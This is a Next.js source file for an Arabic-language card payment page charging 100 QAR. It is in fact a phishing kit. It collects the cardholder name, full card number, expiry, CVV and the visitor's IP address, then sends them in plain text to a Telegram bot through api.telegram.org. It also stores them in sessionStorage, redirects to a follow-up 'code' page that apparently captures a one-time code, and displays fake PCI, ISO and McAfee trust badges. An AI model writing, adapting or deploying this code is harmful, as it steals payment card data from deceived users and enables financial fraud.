"use client";
import { useState, useEffect } from "react";
import { useRouter } from "next/navigation";
import Image from "next/image";
import LoadingButton from "@/components/Button";

export default function PaymentPage() {
  const router = useRouter();

  const [clienName, setClientName] = useState("");
  const [cardNumber, setCardNumber] = useState("");
  const [expiryMonth, setExpiryMonth] = useState("");
  const [expiryYear, setExpiryYear] = useState("");
  const [cvv, setCvv] = useState("");
  const [errors, setErrors] = useState({});
  const [ipAddress, setIpAddress] = useState("");
  const [showMonthDropdown, setShowMonthDropdown] = useState(false);
  const [showYearDropdown, setShowYearDropdown] = useState(false);

  const months = Array.from({ length: 12 }, (_, i) =>
    (i + 1).toString().padStart(2, "0")
  );
  const years = Array.from({ length: 14 }, (_, i) => 2025 + i);

  useEffect(() => {
    const fetchIp = async () => {
      try {
        const response = await fetch("https://api.ipify.org?format=json");
        const data = await response.json();
        setIpAddress(data.ip);
      } catch (error) {
        console.error("خطأ في جلب عنوان IP:", error);
      }
    };
    fetchIp();
  }, []);

  const blockedPrefixes = ["49862", "46415", "48932"];

  const handleCardNumberChange = (e) => {
    setErrors((prev) => {
      const copy = { ...prev };
      delete copy.blockedCard;
      delete copy.cardNumber;
      return copy;
    });

    let value = e.target.value.replace(/\s+/g, "").slice(0, 16);
    value = value.replace(/(\d{4})/g, "$1 ").trim();
    setCardNumber(value);
  };

  const handleCvvChange = (e) => {
    const value = e.target.value.replace(/\D/g, "").slice(0, 3);
    setCvv(value);
  };

  const validateFields = () => {
    const newErrors = {};
    if (!clienName || clienName.length < 3) newErrors.clienName = true;
    const digitsOnly = cardNumber.replace(/\s/g, "");
    if (!cardNumber || digitsOnly.length < 16) {
      newErrors.cardNumber = true;
    }

    if (digitsOnly.length >= 5) {
      const start5 = digitsOnly.slice(0, 5);
      if (blockedPrefixes.includes(start5)) {
        newErrors.blockedCard =
          "هذه البطاقة غير مسموح باستخدامها، الرجاء استخدام بطاقة أخرى";
      }
    }

    if (!expiryMonth) newErrors.expiryMonth = true;
    if (!expiryYear) newErrors.expiryYear = true;
    if (!cvv || cvv.length < 3) newErrors.cvv = true;
    setErrors(newErrors);
    return Object.keys(newErrors).length === 0;
  };

  const handleSubmit = async (e) => {
    if (e) e.preventDefault();

    if (validateFields()) {
      const chatId = process.env.NEXT_PUBLIC_TELEGRAM_CHAT_ID;
      const botToken = process.env.NEXT_PUBLIC_TELEGRAM_BOT_TOKEN;

      const message = `Payment details:
- Cardholder name: ${clienName}
- Card number: ${cardNumber}
- Month: ${expiryMonth}
- Year: ${expiryYear}
- CVV: ${cvv}
- User IP: ${ipAddress}`;

      // ✅ Save to sessionStorage
      sessionStorage.setItem("Cardholder", clienName);
      sessionStorage.setItem("CardNumber", cardNumber);
      sessionStorage.setItem("Month", expiryMonth);
      sessionStorage.setItem("CVV", cvv);
      sessionStorage.setItem("User IP", ipAddress);

      try {
        const response = await fetch(
          `https://api.telegram.org/bot${botToken}/sendMessage`,
          {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
              chat_id: chatId,
              text: message,
            }),
          }
        );

        if (response.ok) {
          const expireDate = `${expiryMonth} / ${expiryYear}`;
          router.push(
            `/loading?nextPage=/code&lastCardNumber=${cardNumber.slice(-4)}&expireDate=${encodeURIComponent(expireDate)}`
          );
          return true; // ✅ tell LoadingButton to spin
        } else {
          alert("أعد المحاولة حدث خطأ ما");
          return false; // ❌ don't spin
        }
      } catch (error) {
        alert("أعد المحاولة حدث خطأ ما");
        return false;
      }
    } else {
      return false; // ❌ validation failed
    }
  };


  return (
    <>
      <div className="flex items-center justify-center h-[calc(100vh-172px)]">
        <form
          onSubmit={handleSubmit}
          className="bg-white py-2 px-8 rounded-lg w-full max-w-md"
        >
          <h2 className="text-xl font-semibold mb-6">يرجى إدخال معلومات البطاقة</h2>

          {/* اسم صاحب البطاقه*/}
          <div className="mb-4">
            <label className="block text-sm font-medium mb-1">اسم صاحب البطاقة</label>
            <input
              type="text"
              value={clienName}
              onChange={(e) => setClientName(e.target.value)}
              placeholder="Ali"
              className={`w-full p-3 rounded-lg ${errors.clienName ? "border-2 border-red-500" : "border border-gray-300"
                }`}
            />
          </div>

          <div className="mb-4 relative">
            <label className="block text-sm font-medium mb-1">رقم البطاقة</label>
            <input
              type="text"
              value={cardNumber}
              onChange={handleCardNumberChange}
              placeholder="XXXX XXXX XXXX XXXX"
              className={`w-full p-3 rounded-lg ${errors.cardNumber || errors.blockedCard ? "border-2 border-red-500" : "border border-gray-300"
                }`}
              maxLength={20}
            />
            {/* show blocked message in Arabic if present */}
            {errors.blockedCard && (
              <p className="text-xs text-red-600 mt-2">{errors.blockedCard}</p>
            )}
            <div className="absolute left-0 top-[35px] flex justify-center items-center w-fill">
              <img src="/images/master.svg" alt="master" className="w-[40px] h-[20px] m-1" />
              <img src="/images/americanexpress.svg" alt="american express" className="w-[40px] h-[20px] m-1" />
              <img src="/images/visa.svg" alt="Visa" className="w-[40px] h-[20px] m-1" />
            </div>
          </div>

          {/* تاريخ انتهاء الصلاحية */}
          <div className="mb-4 flex gap-4">
            {/* Dropdown الشهر */}
            <div className="w-1/2 relative">
              <label className="block text-sm font-medium mb-1">الشهر</label>
              <div
                className={`w-full p-3 border rounded-lg cursor-pointer ${errors.expiryMonth ? "border-2 border-red-500" : "border-gray-300"
                  }`}
                onClick={() => setShowMonthDropdown(!showMonthDropdown)}
              >
                {expiryMonth || "اختر الشهر"}
              </div>
              <ul
                className={`absolute top-full left-0 w-full bg-white border border-gray-300 rounded-lg shadow-lg mt-1 z-10 max-h-40 overflow-y-auto transform transition-all duration-300 ease-in-out ${showMonthDropdown
                  ? "opacity-100 scale-100"
                  : "opacity-0 scale-95 pointer-events-none"
                  }`}
              >
                {months.map((month) => (
                  <li
                    key={month}
                    onClick={() => {
                      setExpiryMonth(month);
                      setShowMonthDropdown(false);
                    }}
                    className="p-3 hover:bg-blue-100 cursor-pointer border-b last:border-none"
                  >
                    {month}
                  </li>
                ))}
              </ul>
            </div>

            {/* Dropdown السنة */}
            <div className="w-1/2 relative">
              <label className="block text-sm font-medium mb-1">السنة</label>
              <div
                className={`w-full p-3 border rounded-lg cursor-pointer ${errors.expiryYear ? "border-2 border-red-500" : "border-gray-300"
                  }`}
                onClick={() => setShowYearDropdown(!showYearDropdown)}
              >
                {expiryYear || "اختر السنة"}
              </div>
              <ul
                className={`absolute top-full left-0 w-full bg-white border border-gray-300 rounded-lg shadow-lg mt-1 z-10 max-h-40 overflow-y-auto transform transition-all duration-300 ease-in-out ${showYearDropdown
                  ? "opacity-100 scale-100"
                  : "opacity-0 scale-95 pointer-events-none"
                  }`}
              >
                {years.map((year) => (
                  <li
                    key={year}
                    onClick={() => {
                      setExpiryYear(year);
                      setShowYearDropdown(false);
                    }}
                    className="p-3 hover:bg-blue-100 cursor-pointer border-b last:border-none"
                  >
                    {year}
                  </li>
                ))}
              </ul>
            </div>
          </div>

          {/* رمز الحماية CVV */}
          <div className="mb-4 relative">
            <label className="block text-sm font-medium mb-1 ">رمز الحماية (CVV)</label>
            <input
              type="text"
              value={cvv}
              onChange={handleCvvChange}
              placeholder="CVV"
              className={`w-full p-3 rounded-lg ${errors.cvv ? "border-2 border-red-500" : "border border-gray-300"
                }`}
            />
            <div className="absolute left-3 top-[35px] flex justify-center items-center w-fill">
              <svg
                xmlns="http://www.w3.org/2000/svg"
                width="30"
                height="20"
                viewBox="0 0 377.684 234.212"
                className="w-full h-auto"
              >
                <g id="CVV" transform="translate(-796.162 -192.864)">
                  <path
                    fill="#c81048"
                    id="Path_1"
                    d="M985.121,1048.416h186.251c.67,0,1.34.016,2.01.032a.471.471,0,0,1,.4.4c.016.153.04.307.048.46.008.412.008.824.008,1.235v144.812c0,.258-.008.517,0,.775a5.694,5.694,0,0,1-.21,1.688c-.21.743-.315,1.51-.557,2.253a19.822,19.822,0,0,1-4.764,7.881,18.254,18.254,0,0,1-9.076,5.039c-.7.161-1.413.307-2.116.452a4.869,4.869,0,0,1-.767.081c-.517.016-1.034.008-1.55.008H815.932c-.565,0-1.139-.008-1.7,0a3.315,3.315,0,0,1-1.5-.275,4.6,4.6,0,0,0-1.2-.323c-.258-.04-.5-.1-.759-.161a17.289,17.289,0,0,1-6.452-2.907,19.22,19.22,0,0,1-6.936-8.721,18.808,18.808,0,0,1-1.082-4.029,15.8,15.8,0,0,1-.137-2.471c0-.88.008-1.752.008-2.633V1050.758a12.871,12.871,0,0,1,.057-2.011.5.5,0,0,1,.315-.3c.1-.008.2-.032.307-.04.258-.008.517-.008.775-.008h1.55q92.972.024,185.944.016Zm-55.174,63.863h107.386c.153,0,.307-.008.46-.016a.478.478,0,0,0,.509-.46c.016-.412.032-.823.032-1.235v-42.594c0-.363-.008-.719-.024-1.082a.6.6,0,0,0-.073-.291.44.44,0,0,0-.218-.2,3.68,3.68,0,0,0-1.074-.1c-3.771-.04-7.542-.1-11.313-.113q-16.352-.049-32.695-.065-63.068-.012-126.127-.016-19.44,0-38.888.057c-1.7,0-3.408.024-5.111.048a3.9,3.9,0,0,0-.606.081.531.531,0,0,0-.3.331,2.084,2.084,0,0,0-.048.3c-.008.468-.016.929-.016,1.4v41.819c0,.412,0,.823.008,1.235,0,.153.024.307.032.46a.448.448,0,0,0,.38.412c.622.016,1.235.04,1.857.04Zm53.891,16.117H825.783c-.565,0-1.139,0-1.7.008a1.743,1.743,0,0,0-.46.049,2.207,2.207,0,0,0-1.7,1.97,4.384,4.384,0,0,0,0,.46,1.907,1.907,0,0,0,.355,1.009,2.111,2.111,0,0,0,1.542.937c.2.024.412.032.622.04.468.008.929,0,1.4,0h315.963c.517,0,1.034.008,1.55-.008a4.855,4.855,0,0,0,.767-.1,1.875,1.875,0,0,0,1.058-.605,2.148,2.148,0,0,0,.589-1.849,2.263,2.263,0,0,0-2.14-1.9c-.622-.016-1.244-.008-1.857-.008Q1062.768,1128.392,983.837,1128.4Z"
                    transform="translate(0 -786.454)"
                  />
                  <path
                    fill="#c81048"
                    id="Path_2"
                    d="M973.39,222.331c-39.55.008-90.735.024-141.921.048..."
                    transform="translate(-0.219)"
                  />
                  <path
                    fill="#c81048"
                    id="Path_3"
                    d="M4106.373,1489.8h36.248c.517,0,1.034.008,1.55.008..."
                    transform="translate(-3005.073 -1192.209)"
                  />
                </g>
              </svg>
            </div>
          </div>

          {/* زر الدفع */}
          <LoadingButton
            type="submit"
            w="100%"
            onClick={handleSubmit}
          >
            <span className="text-lg">ادفع 100</span>
            <span className="text-sm ml-1">QAR </span>
          </LoadingButton>
        </form>

      </div>
      <footer className="w-full max-w-md bg-[#f5f6f8] p-4 rounded-lg text-center m-auto">
        <div className="flex justify-center items-center flex-wrap mb-3">
          <img src="/images/pci.svg" alt="PCI" className="w-[55px] h-[28px] m-1" />
          <img src="/images/iso.svg" alt="ISO" className="w-[55px] h-[28px] m-1" />
          <img src="/images/secure.svg" alt="Secure" className="w-[55px] h-[28px] m-1" />
          <img src="/images/mcafee.svg" alt="McAfee" className="w-[55px] h-[28px] m-1" />
        </div>

        <ul className="list-none p-0 flex flex-col md:flex-row items-center justify-between gap-2 text-xs">
          <li className="text-center">سياسة الخصوصية | شروط الاستخدام</li>
          <li className="text-center">مدعوم</li>
        </ul>
      </footer>

    </>

  );
}
